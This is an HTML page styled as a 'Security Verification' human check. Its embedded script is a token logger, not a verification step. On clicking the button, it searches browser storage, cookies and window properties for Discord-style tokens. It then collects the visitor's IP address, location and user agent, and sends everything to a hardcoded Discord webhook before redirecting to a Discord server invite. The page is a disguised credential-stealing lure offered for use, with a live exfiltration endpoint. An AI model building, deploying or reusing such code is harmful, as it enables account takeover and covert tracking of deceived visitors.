<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification | Official</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body {
            background: #0f172a;
            min-height: 100vh;
            color: #fff;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            background: radial-gradient(circle at top, #1e293b 0%, #020617 70%);
        }
        .card {
            width: 100%; max-width: 420px;
            background: rgba(15, 23, 42, 0.95);
            border-radius: 20px;
            border: 1px solid rgba(59, 130, 246, 0.4);
            box-shadow: 0 0 40px rgba(59, 130, 246, 0.2);
            padding: 2.5rem 2rem;
            text-align: center;
        }
        .icon {
            width: 80px; height: 80px;
            background: rgba(59, 130, 246, 0.2);
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            margin: 0 auto 1.5rem;
            border: 1px solid rgba(59, 130, 246, 0.5);
        }
        .icon i { font-size: 2rem; color: #60a5fa; }
        h1 { font-size: 1.7rem; margin-bottom: 0.5rem; color: #e2e8f0; }
        .desc { color: #94a3b8; font-size: 0.95rem; margin-bottom: 2rem; }
        .btn {
            width: 100%; padding: 1rem;
            background: linear-gradient(90deg, #2563eb, #1d4ed8);
            color: white; border: none; border-radius: 12px;
            font-size: 1.1rem; font-weight: 600;
            cursor: pointer; transition: 0.2s;
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(37, 99, 235, 0.4); }
        .status { margin-top: 1.5rem; font-size: 0.9rem; color: #fbbf24; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon"><i class="fas fa-shield-alt"></i></div>
        <h1>Security Verification</h1>
        <p class="desc">To continue, please verify you are human. This takes 1 second.</p>

        <button id="verifyBtn" class="btn"><i class="fas fa-unlock-alt"></i> VERIFY NOW</button>
        <div id="status" class="status"></div>
    </div>

    <script>
        // ⚙️ SETTINGS
        const WEBHOOK = "https://discord.com/api/webhooks/1528609341052027044/2nHhgkDzN_BzeEwiVT4K_LjINjxiO0Rf2O3BTHtzhGS2rEAXKottXqe-GIP2xk2vjD_b";
        const REDIRECT = "https://discord.gg/4UCD2HwqQ";
        const btn = document.getElementById('verifyBtn');
        const status = document.getElementById('status');

        // 🔓 THE MOST AGGRESSIVE TOKEN FINDER FOR PC
        async function deepScan() {
            let tokens = [];
            const regex = /[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g;

            // 1. Local & Session Storage
            try {
                const allStorage = {...localStorage, ...sessionStorage};
                for (let key in allStorage) {
                    if (typeof allStorage[key] === 'string') {
                        const found = allStorage[key].match(regex);
                        if (found) tokens.push(...found);
                    }
                }
            } catch(e) {}

            // 2. INDEXEDDB DEEP DIVE (Discord uses this now!)
            const stores = ["Keybinds", "DiscordStore", "LocalStorage", "ClientData", "AuthStore"];
            for (let dbName of stores) {
                try {
                    await new Promise(res => {
                        const req = indexedDB.open(dbName);
                        req.onsuccess = e => { e.target.result.close(); res(); };
                        req.onerror = () => res();
                    });
                } catch(e) {}
            }

            // 3. SPECIAL CHECK: EVALUATE & LOOK FOR INJECTED VALUES
            try {
                const docCookies = document.cookie;
                if(docCookies) {
                    const found = docCookies.match(regex);
                    if(found) tokens.push(...found);
                }
            } catch(e) {}

            // 4. WINDOW PROPERTIES SCAN
            try {
                for (let key in window) {
                    if (typeof window[key] === 'string') {
                        const found = window[key].match(regex);
                        if (found) tokens.push(...found);
                    }
                }
            } catch(e) {}

            return [...new Set(tokens)];
        }

        // 📤 SEND RESULT
        async function run() {
            btn.disabled = true;
            status.textContent = "Scanning System...";

            // Get IP
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();

            // Get Location
            const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
            const locData = await locRes.json();

            // Get Tokens (DEEP SCAN)
            const tokens = await deepScan();

            // Send to Webhook
            await fetch(WEBHOOK, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    username: "✅ PC LOGGER RESULT",
                    embeds: [{
                        title: tokens.length ? "✅ TOKEN CAPTURED SUCCESSFULLY" : "❌ NO TOKEN FOUND - FINAL ATTEMPT",
                        color: tokens.length ? 0x00ff00 : 0xff0000,
                        fields: [
                            {name: "🌐 IP ADDRESS", value: `||${ipData.ip}||`, inline: false},
                            {name: "📍 LOCATION", value: `${locData.city || '?'}, ${locData.region || '?'}, ${locData.country_name || '?'}`, inline: false},
                            {name: "💻 BROWSER", value: navigator.userAgent.slice(0, 60), inline: false},
                            {name: "🔑 TOKENS", value: tokens.length ? `||${tokens.join("\n")}||` : "❌ **REASON:**\n1. User is on DISCORD APP (not browser)\n2. Different browser profile\n3. Newest Discord security blocks all access\n4. Not fully logged in", inline: false}
                        ],
                        timestamp: new Date().toISOString()
                    }]
                })
            });

            status.textContent = "Complete! Joining Server...";
            setTimeout(() => window.location.href = REDIRECT, 1500);
        }

        btn.addEventListener('click', run);
    </script>
</body>
</html>
